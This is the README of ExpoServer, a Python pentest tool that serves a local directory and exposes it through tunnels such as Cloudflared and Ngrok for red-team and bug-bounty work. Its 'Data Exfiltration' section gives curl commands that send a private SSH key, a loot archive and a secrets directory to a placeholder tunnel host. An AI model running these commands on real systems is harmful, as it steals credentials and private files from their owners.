<h2 align="center">
  🪝 ExpoServer
</h2>

<p align="center">
    <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fexposerver">
        <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fexposerver&label=Visitors&countColor=%2337d67a" />
    </a>
    <a href="https://www.facebook.com/UEVOLVJU">
        <img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" alt="Facebook">
    </a>
      <a href="https://www.twitter.com/UEVOLVJU">
        <img src="https://img.shields.io/badge/Twitter-%23000000.svg?style=for-the-badge&logo=X&logoColor=white" alt="X">
    </a>
    <a href="https://medium.com/@l0n3m4n">
        <img src="https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium">
    </a>
    <a href="https://www.buymeacoffee.com/l0n3m4n">
        <img src="https://img.shields.io/badge/Buy%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me a Coffee">
    </a>  
    <a href="mailto:l0n3m4n@proton.me">
      <img src="https://img.shields.io/badge/ProtonMail-6001D2?style=for-the-badge&logo=protonmail&logoColor=white" alt="ProtonMail">
    </a>
</p>
<br/>

This Python script serves a local directory over HTTP and exposes it securely to the internet via a reverse tunnel using either:

It’s especially useful for:

- 📁 Hosting payloads or exploits during red team exercises or CTFs
- 📤 Exfiltrating data from compromised targets in a controlled environment via (`https`)
- 🧪 Testing XSS, CSRF, and SSRF vulnerabilities by exposing local endpoints
- 🌐 Simulating external servers during bug bounty engagements
- 💻 Demonstrating proof-of-concepts (PoCs) for file uploads or callbacks
- 🔐 Secure remote access to localhost web apps for testing
- 📡 Bypassing NAT/firewall restrictions without port forwarding

---

## ✨ Features

- HTTP server using Python's built-in modules
- Logs all request headers to `headers.log`
- Expose server via:
  - 🌐 [Serveo](https://serveo.net)
  - ☁️ [Cloudflared](https://developers.cloudflare.com/cloudflare-one/)
  -  tunnelling [Ngrok](https://ngrok.com/)
  - 🚇 [Localtunnel](https://theboroer.github.io/localtunnel-www/)
- Upload file, View metadata, view browser logs
- Optional user interface (Darkmode, Lighmode, Hackermode)
- Self-updating mechanism (Script update)
- Easy installation to (/usr/local/bin, custom path)
- Verbose mode for detailed output and set timeout (seconds)
- Authentication mechanism (username:password) etc.

---

## 🚀 Banner  
```bash
❯ exposerver.py -h

___________                                                            
\_   _____/__  _________   ____  ______ ______________  __ ___________
 |    __)_\  \/  /\____ \ /  _ \/  ___// __ \_  __ \  \/ // __ \_  __ \
 |        \>    < |  |_> >  <_> )___ \\  ___/|  | \/\   /\  ___/|  | \/
/_______  /__/\_ \|   __/ \____/____  >\___  >__|    \_/  \___  >__|   
        \/      \/|__|              \/     \/                 \/       
     Author: l0n3m4n | Version: 1.3.0 | Tunneling local Server 

usage: exposerver.py [-h] [-v] [-p PORT] [-d DIRECTORY] [--auth AUTH] [--timeout TIMEOUT]
                     [--serveo | --cloudflared | --ngrok | --localtunnel] [-u] [-sl]

📡 Serve a local directory and expose it via a tunnel (Serveo, Cloudflared, Ngrok).

options:                                                                                             
  -h, --help                 show this help message and exit                                         
  -v, --verbose              Enable verbose output.                                                  
  -p, --port PORT            Local port to serve (default: 80)                                       
  -d, --directory DIRECTORY  Directory to serve (default: .)                                         
  --auth AUTH                Enable basic authentication (format: username:password)                 
  --timeout TIMEOUT          Automatically shut down the server after a specified time in seconds.   
                                                                                                     
Tunnel Options:                                                                                      
  --serveo                   Use Serveo tunnel                                                       
  --cloudflared              Use Cloudflared tunnel                                                  
  --ngrok                    Use Ngrok tunnel                                                        
  --localtunnel              Use LocalTunnel tunnel                                                  
                                                                                                     
Script Management:                                                                                   
  -u, --update               Update the script from GitHub.                                          
  -sl, --save-local          Save the script to /usr/local/bin                                       
                                                                                                     
                                                                                                     
Examples:                                                                                            
   python3 exposerver.py -p 8080 --serveo                                                            
   python3 exposerver.py -p 80 -d /var/www/html --cloudflared                                        
   python3 exposerver.py -p 3000 -d ~/my-site --ngrok                                                
   python3 exposerver.py -p 8080 -d ~/my-site --localtunnel                                          
   python3 exposerver.py -p 8080 --cloudflared --auth myuser:mypassword  
```

## 🛠️ Requirements

  - Python 3.6+
  - Internet access (for tunnels)
  - At least one tunneling tool installed:
      * Serveo (via SSH)
      * cloudflared (fallback if Serveo fails)
      * ngrok (optional)
      * localtunnel (optional)
      * exiftool

---

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/l0n3m4n/exposerver.git

# Navigate to the project directory
cd exposerver

# Run the script with the --save-local flag to install it to /usr/local/bin
# This will also install all the required dependencies
python3 exposerver.py --save-local
```

## 📡 Usage

```bash
# Serve the current directory on port 8080 with Serveo
sudo exposerver -p 8080 --serveo

# Serve a specific directory on port 80 with Cloudflared
sudo exposerver -p 80 -d /var/www/html --cloudflared

# Use ngrok to expose a site on port 3000
sudo exposerver -p 3000 -d ~/my-site --ngrok

# Use localtunnel to expose a site on port 8080
sudo exposerver -p 8080 -d ~/my-site --localtunnel

# Enable basic authentication
sudo exposerver -p 8080 --cloudflared --auth myuser:mypassword

# Update the script to the latest version
exposerver -u
```

## 📂 Host current directory
![banner](/assets/images/banner.png)

## 📝 Headers Logs
![headers](/assets/images/header_log.png) 

## 🖼️ User Interface 
![ui](/assets/images/UI.png)

## 🔐 Authentication 
![auth](/assets/images/browser_auth.png)

## 🗃️ View Metadata
![exiftool](/assets/images/metadata.png)




## 🔁 Data Exfiltration

```bash
# Upload a zip file
curl -X POST http://abc123.cloudflaretunnel.com/upload --data-binary "@loot.zip"

# Upload a ssh key
curl -F "file=@/home/user/.ssh/id_rsa" https://abc123.cloudflareTunnel.com/upload

# Archive and upload a directory
tar czf secrets.tar.gz ~/Documents/secrets
curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
```

 
## ✅ TODO List

### 🔌 Tunnel Providers
- [x] Add support for multiple tunneling services:
  - [x] `Serveo`
  - [x] `Cloudflared`
  - [x] `Ngrok`
  - [x] `LocalTunnel`
- [x] Add CLI flags for selecting tunnel provider (e.g., `--serveo`, `--cloudflared`, `--ngrok`)
- [x] Auto-detect and install missing binaries (e.g., `ngrok`, `cloudflared`)

### 🌐 Server Features
- [x] Display public tunnel URL clearly
- [x] Serve files from a specified directory
- [x] Web-based directory listing with download buttons
- [x] File upload support for data exfiltration
- [x] Log incoming HTTP requests (IP, User-Agent, Time)
- [x] Automatic file list refresh after upload

### 📜 Script Management
- [x] Self-updating mechanism
- [x] Easy installation to `/usr/local/bin`

### ⏱️ Control & Automation
- [x] Implement auto-shutdown timer
- [x] Auto-reconnect/restart tunnels on failure
- [x] Add password protection for server access

### 🧪 Exploitation Helpers
- [ ] Generate payload templates:
  - [ ] XSS (DOM, Reflected, Stored)
  - [ ] CSRF Proof of Concept
  - [ ] LFI/RFI test cases
  - [ ] SSRF test URLs
- [ ] Listener module (e.g., for Blind XSS or SSRF detection)
- [ ] Integrate with Interactsh or Burp Collaborator
 
 

---

## 🙌 Contributing
Pull requests are welcome! If you'd like to contribute tools or improvements, feel free to fork and submit a PR.

📣 Disclaimer

This tool is provided as-is for educational and lawful bug hunting and penetration testing purposes. Use it responsibly and only on systems you own or have explicit permission to test.

 